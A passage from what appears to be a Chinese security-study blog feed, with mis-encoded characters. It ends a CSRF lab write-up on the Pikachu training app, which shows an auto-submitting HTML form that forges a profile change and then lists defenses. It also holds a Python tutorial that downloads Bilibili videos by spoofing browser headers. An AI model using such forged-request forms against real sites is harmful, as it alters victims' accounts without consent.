src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323212754122.png" alt="image-20210323212754122"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸ªäººä¿¡æ¯å†…å®¹æŒ‰ç…§æ¶æ„é“¾æ¥çš„è®¾ç½®è¢«ä¿®æ”¹äº†ï¼Œè€Œç”¨æˆ·ç”²ä»…ç‚¹å‡»äº†é‚£ä¸ªä¸æ˜é“¾æ¥ã€‚</p><h2 id="POSTæ–¹å¼"><a href="#POSTæ–¹å¼" class="headerlink" title="POSTæ–¹å¼"></a>POSTæ–¹å¼</h2><p>â€‹    â‘  åŒæ ·ï¼Œç”¨æˆ·ä¹™ç™»å½•äº†ä»–ä¿¡ä»»çš„ç½‘ç«™ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213429091.png" alt="image-20210323213429091"></p><p>â€‹    â‘¡ æ”»å‡»è€…æ„é€ æ¶æ„çš„é“¾æ¥ï¼Œå¹¶å°†å…¶å‘é€ç»™ç”¨æˆ·ä¹™ã€‚</p><p>æŠ“åŒ…å¯è§è¿™æ¬¡çš„è¯·æ±‚æ–¹å¼æ˜¯POSTï¼ŒURLä¸å†æ˜¾ç¤ºä¿®æ”¹å‚æ•°ï¼Œæ‰€ä»¥æ— æ³•å†ä½¿ç”¨ä¸Šè¿°åŠæ³•ï¼ˆå³é€šè¿‡URLæ¥ä¼ªé€ è¯·æ±‚ï¼‰è¿›è¡Œä¿®æ”¹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323213939444.png" alt="image-20210323213939444"></p><p>ä½†å¯ä»¥è‡ªè¡Œåˆ›å»ºä¸€ä¸ªæ¶æ„è¡¨å•ï¼Œè®©ç”¨æˆ·ç‚¹å‡»è¿™ä¸ªè¡¨å•çš„URLï¼Œé€šè¿‡æ­¤è¡¨å•å‘å­˜åœ¨CSRFæ¼æ´çš„é¡µé¢å»æäº¤POSTè¯·æ±‚ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf_post<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;postsubmit&quot;</span>).click();</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    â‘¢ ç”¨æˆ·ä¹™ç‚¹å‡»äº†è¿™ä¸ªæ¶æ„è¡¨å•çš„é“¾æ¥åï¼Œå…¶ä¸ªäººä¿¡æ¯è¢«ä¿®æ”¹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210323215151210.png" alt="image-20210323215151210"></p><h1 id="CSRFé˜²å¾¡"><a href="#CSRFé˜²å¾¡" class="headerlink" title="CSRFé˜²å¾¡"></a>CSRFé˜²å¾¡</h1><p>â€‹    â‘  å°½é‡ä½¿ç”¨POST</p><p>GETæ¥å£å¤ªå®¹æ˜“è¢«æ‹¿æ¥åšCSRFæ”»å‡»ï¼Œæ¥å£æœ€å¥½é™åˆ¶ä¸ºPOSTä½¿ç”¨ï¼Œé™ä½æ”»å‡»é£é™©ã€‚</p><p>å½“ç„¶POSTå¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±ï¼Œæ”»å‡»è€…åªè¦æ„é€ ä¸€ä¸ªformå°±å¯ä»¥ï¼Œä½†éœ€è¦åœ¨ç¬¬ä¸‰æ–¹é¡µé¢åšï¼Œè¿™æ ·å°±å¢åŠ æš´éœ²çš„å¯èƒ½æ€§ã€‚</p><p>â€‹    â‘¡ äºŒæ¬¡éªŒè¯</p><p>åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç èƒ½å¾ˆå¥½éåˆ¶CSRFæ”»å‡»ã€‚å½“ç”¨æˆ·æ”¶åˆ°éªŒè¯ç æç¤ºåï¼Œå¯èƒ½ä¼šå¿ƒå­˜æ€€ç–‘ï¼Œå°±ä¸ä¼šä¹–ä¹–ä¸­æ‹›ã€‚ä½†æ˜¯å‡ºäºç”¨æˆ·ä½“éªŒè€ƒè™‘ï¼Œç½‘ç«™ä¸èƒ½ç»™æ‰€æœ‰çš„æ“ä½œéƒ½åŠ ä¸ŠéªŒè¯ç ã€‚</p><p>â€‹    â‘¢ Referer Check</p><p>Referer Checkåœ¨Webæœ€å¸¸è§çš„åº”ç”¨å°±æ˜¯â€œé˜²æ­¢å›¾ç‰‡ç›—é“¾â€ã€‚åŒç†ï¼ŒReferer Checkä¹Ÿå¯ä»¥è¢«ç”¨äºæ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„â€œæºâ€ï¼ˆRefererå€¼æ˜¯å¦æ˜¯æŒ‡å®šé¡µé¢ï¼Œæˆ–è€…ç½‘ç«™çš„åŸŸï¼‰ï¼Œå¦‚æœéƒ½ä¸æ˜¯ï¼Œé‚£ä¹ˆå°±æå¯èƒ½æ˜¯CSRFæ”»å‡»ã€‚</p><p>ä½†æ˜¯å› ä¸ºæœåŠ¡å™¨å¹¶ä¸æ˜¯ä»€ä¹ˆæ—¶å€™éƒ½èƒ½å–åˆ°Refererï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•ä½œä¸ºCSRFé˜²å¾¡çš„ä¸»è¦æ‰‹æ®µã€‚</p><p>â€‹    â‘£ Tokenè®¤è¯</p><p>Token å³æ ‡å¿—ï¼Œè®°å·çš„æ„æ€ï¼Œä¹Ÿå«ä½œä»¤ç‰Œã€‚</p><p>ä¾‹å­ï¼š</p><ol><li>ç”¨æˆ·è®¿é—®æŸä¸ªè¡¨å•é¡µé¢ã€‚</li><li>æœåŠ¡ç«¯ç”Ÿæˆä¸€ä¸ªTokenï¼Œæ”¾åœ¨ç”¨æˆ·çš„Sessionä¸­ï¼Œæˆ–è€…æµè§ˆå™¨çš„Cookieä¸­ã€‚</li><li>åœ¨é¡µé¢è¡¨å•é™„å¸¦ä¸ŠTokenå‚æ•°ã€‚</li><li>ç”¨æˆ·æäº¤è¯·æ±‚åï¼Œ æœåŠ¡ç«¯éªŒè¯è¡¨å•ä¸­çš„Tokenæ˜¯å¦ä¸ç”¨æˆ·Sessionï¼ˆæˆ–Cookiesï¼‰ä¸­çš„Tokenä¸€è‡´ï¼Œä¸€è‡´ä¸ºåˆæ³•è¯·æ±‚ï¼Œä¸æ˜¯åˆ™éæ³•è¯·æ±‚ã€‚</li></ol><p>è¿™ä¸ªTokençš„å€¼å¿…é¡»æ˜¯éšæœºçš„ï¼Œä¸å¯é¢„æµ‹çš„ã€‚ç”±äºTokençš„å­˜åœ¨ï¼Œæ”»å‡»è€…æ— æ³•å†æ„é€ ä¸€ä¸ªå¸¦æœ‰åˆæ³•Tokençš„è¯·æ±‚å®æ–½CSRFæ”»å‡»ã€‚å¦å¤–ä½¿ç”¨Tokenæ—¶åº”æ³¨æ„Tokençš„ä¿å¯†æ€§ï¼Œå°½é‡æŠŠæ•æ„Ÿæ“ä½œç”±GETæ”¹ä¸ºPOSTï¼Œä»¥formæˆ–AJAXå½¢å¼æäº¤ï¼Œé¿å…Tokenæ³„éœ²ã€‚</p><blockquote><p>CSRFçš„Tokenä»…ä»…é€‚ç”¨äºå¯¹æŠ—CSRFæ”»å‡»ã€‚å½“ç½‘ç«™åŒæ—¶å­˜åœ¨XSSæ¼æ´æ—¶å€™ï¼Œé‚£è¿™ä¸ªæ–¹æ¡ˆä¹Ÿæ˜¯ç©ºè°ˆã€‚å› ä¸ºæ”»å‡»è€…å¯ä»¥é€šè¿‡jsè·å–Tokenå€¼ã€‚</p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">Pikachuä¹‹CSRF</a></p><p>[2] <a href="https://blog.csdn.net/m0_37732829/article/details/90513122?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">Webå®‰å…¨ä¹‹CSRFæ”»å‡»</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonçˆ¬è™«è½»æ¾æå®šBç«™è§†é¢‘ä¸‹è½½</title>
      <link href="posts/3575.html"/>
      <url>posts/3575.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼ˆä¸ä½¿ç”¨å…¶ä»–å·¥å…·æˆ–æ’ä»¶ï¼‰ï¼ŒWebç«¯çš„bilibiliä¼¼ä¹æ— æ³•ï¼ˆå½»åº•ç™½å«–ï¼‰ä¸‹è½½è§†é¢‘ï¼Œé‚å­¦ä¹ äº†å¦‚ä½•åˆ©ç”¨Pythonçˆ¬è™«ä¸‹è½½bç«™è§†é¢‘ï¼ˆä¸åŒ…æ‹¬ä¼šå‘˜è§†é¢‘ï¼‰ï¼Œè¯¦æƒ…ï¼ˆæ‰‹æ³•ï¼‰ä¸”çœ‹ä¸‹æ–‡ã€‚</p><blockquote><p>å‚è€ƒè§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1Fy4y1D7XS">https://www.bilibili.com/video/BV1Fy4y1D7XS</a></p><p>åœ¨åˆ†æbç«™ç½‘é¡µæºä»£ç çš„è¿‡ç¨‹ä¸­å‘ç°å…¶è§†é¢‘å’ŒéŸ³é¢‘æ˜¯åˆ†å¼€çš„ï¼Œä¸‹è½½åä¸€ä¸ªåªæœ‰å£°éŸ³ï¼Œä¸€ä¸ªåªæœ‰ç”»é¢ï¼Œè¿™æ˜¾ç„¶ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ã€‚è§£å†³æ–¹æ¡ˆæ˜¯ï¼šåˆ©ç”¨ <a href="http://www.ffmpeg.org/download.html">ffmpeg</a> è¿™æ¬¾å¼ºå¤§çš„å¼€æºå·¥å…·æŠŠä¸‹è½½åçš„éŸ³è§†é¢‘è¿›è¡Œåˆå¹¶ã€‚æ•…æƒ³è¦å®Œç¾ä½“éªŒï¼Œå…ˆå¾—ä¸‹è½½å®‰è£…å¹¶é…ç½®å¥½ <code>ffmpeg</code> ã€‚ï¼ˆåˆ°å®˜ç½‘ä¸‹è½½ï¼Œè§£å‹åæŠŠæ–‡ä»¶å¤¹å†…çš„<code>bin</code> æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼‰</p><p>Pythonä¸­ä½¿ç”¨åˆ°çš„æ¨¡å—æœ‰ï¼š<code>requests</code>ã€<code>re</code>ã€<code>json</code>ã€<code>subprocess</code>ã€<code>os</code></p></blockquote><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><p>è§†é¢‘çš„<code>url</code>æ¯”è¾ƒæ˜¾çœ¼ï¼Œå®¹æ˜“è·å–ã€‚<code>headers</code>ä¹Ÿå¥½æ‰¾ï¼Œä½†è¿˜éœ€è¦ä¸€é‡è¦ä¿¡æ¯ã€‚</p><p>é€šè¿‡æµè§ˆå™¨ï¼ˆF12ï¼‰æŸ¥çœ‹åˆ†æç›®æ ‡ç½‘é¡µï¼Œæ‰¾åˆ°æˆ‘ä»¬çš„ä¸‹ä¸€ç›®æ ‡ï¼Œå³è§†ï¼ˆéŸ³ï¼‰é¢‘ä¸‹è½½é“¾æ¥ã€‚</p><p>ä¸€ç•ªæŸ¥æ‰¾åï¼Œå‘ç°åœ¨<code>head</code>é‡Œçš„ç¬¬å››ä¸ª<code>script</code> æ ‡ç­¾å†…ä¼¼ä¹æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321234819818.png" alt="image-20210321234819818"></p><p>å¯è®¿é—®æ­¤é“¾æ¥ï¼Œå´å‡ºç°403ï¼Œå³æ²¡æœ‰æƒé™è®¿é—®æ­¤ç«™ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235102571.png" alt="image-20210321235102571"></p><p>è¿™åˆæ€ä¹ˆå›äº‹ï¼ŸæŸ¥çœ‹Request Headers ä¿¡æ¯ï¼Œå‘ç°æ²¡æœ‰refererè¿™ä¸€é¡¹ï¼Œäºæ˜¯å°è¯•åœ¨æ•°æ®åŒ…ä¸­åŠ ä¸Šrefererä¿¡æ¯çœ‹èƒ½å¦è®¿é—®ã€‚ï¼ˆè¿™é‡Œç›´æ¥ä¸Šbpäº†ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235900739.png" alt="image-20210321235900739"></p><p>Forwardåï¼Œå‡ºç°æ–‡ä»¶ä¸‹è½½é¡µé¢ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000022154.png" alt="image-20210322000022154"></p><p>ä¸‹è½½åæ‰“å¼€æ”¹æ–‡ä»¶ï¼Œç¡®ä¸ºç›®æ ‡è§†é¢‘ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000250594.png" alt="image-20210322000250594"></p><h1 id="è·å–æ•°æ®"><a href="#è·å–æ•°æ®" class="headerlink" title="è·å–æ•°æ®"></a>è·å–æ•°æ®</h1><p>é€šè¿‡requestsåº“å‘ç›®æ ‡ç«™ç‚¹å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚éœ€åŒ…å«headerã€refererç­‰ä¿¡æ¯ï¼Œä»¥ä¼ªè£…æˆæ˜¯æµè§ˆå™¨å‘å‡ºè¯·æ±‚ã€‚å¦‚æœæœåŠ¡å™¨èƒ½æ­£å¸¸å“åº”ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªResponseï¼Œä¾¿æ˜¯æ‰€è¦è·å–çš„é¡µé¢å†…å®¹ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers) <span class="comment">#å‘é€getè¯·æ±‚ï¼Œè·å¾—å“åº”</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">print(html_data)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322002017006.png" alt="image-20210322002017006"></p><h1 id="è§£æå†…å®¹"><a href="#è§£æå†…å®¹" class="headerlink" title="è§£æå†…å®¹"></a>è§£æå†…å®¹</h1><p>å¾—åˆ°çš„å†…å®¹å¯èƒ½æ˜¯HTMLã€jsonç­‰æ ¼å¼ï¼Œå¯ä»¥ç”¨é¡µé¢è§£æåº“ã€æ­£åˆ™è¡¨è¾¾å¼ç­‰è¿›è¡Œè§£æã€‚</p><p><strong>title</strong>ä¿¡æ¯æ¯”è¾ƒå¥½æ‰¾ï¼Œå°±åœ¨headä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003021075.png" alt="image-20210322003021075"></p><p>åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹å…¶è¿›è¡Œæå–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>éŸ³è§†é¢‘ä¸‹è½½é“¾æ¥</strong>åœ¨jsonæ•°æ®ä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003718230.png" alt="image-20210322003718230"></p><p>åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œå­—å…¸ï¼ˆåˆ—è¡¨ï¼‰çš„â€œé”®â€å¯¹å…¶æå–ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">json_data &#x3D; re.findall(r&#39;&lt;script&gt;window.__playinfo__&#x3D;(.*?)&lt;&#x2F;script&gt;&#39;,html_data)[0]</span><br><span class="line">    json_data &#x3D; json.loads(json_data) #è§£ç  JSON æ•°æ®ï¼Œè¿”å› Python å­—æ®µçš„æ•°æ®ç±»å‹ã€‚</span><br><span class="line">    audio_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;audio&quot;][0][&quot;backupUrl&quot;][0]</span><br><span class="line">    video_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;video&quot;][0][&quot;backupUrl&quot;][0]</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    <span class="comment">#pprint.pprint(json_data)</span></span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> video_data:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322004738048.png" alt="image-20210322004738048"></p><h1 id="ä¿å­˜æ•°æ®"><a href="#ä¿å­˜æ•°æ®" class="headerlink" title="ä¿å­˜æ•°æ®"></a>ä¿å­˜æ•°æ®</h1><p>é€šè¿‡ä¸‹è½½é“¾æ¥ï¼Œå°†éŸ³è§†é¢‘ä¸‹è½½åˆ°æœ¬åœ°å¹¶ä¿å­˜ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span 